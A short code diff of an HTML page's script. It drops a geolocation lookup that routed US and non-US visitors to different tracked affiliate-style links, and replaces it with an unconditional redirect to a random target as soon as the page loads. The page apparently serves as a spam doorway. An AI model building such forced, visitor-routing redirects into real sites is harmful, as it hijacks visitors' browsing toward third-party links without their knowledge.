@@ -2,7 +2,7 @@
 <html>
 
 <head>
-    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+    <!--script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script-->
     <script>
     var randomLinks = function() {
       var targets = [
@@ -15,14 +15,16 @@
       return targets[index];
     };
 
-    var row = 'http://www.mb103.com/lnk.asp?o=6710&c=918271&a=154558&s1=mlrow'
+     window.location.replace(randomLinks());
+
+    /*var row = 'http://www.mb103.com/lnk.asp?o=6710&c=918271&a=154558&s1=mlrow'
     $.get("http://ipinfo.io", function(response) {
         if (response.country == "US") {
             window.location.replace(randomLinks());
         } else {
             window.location.replace(row);
         }
-    }, "jsonp");
+    }, "jsonp");*/
     </script>
 </head>
 
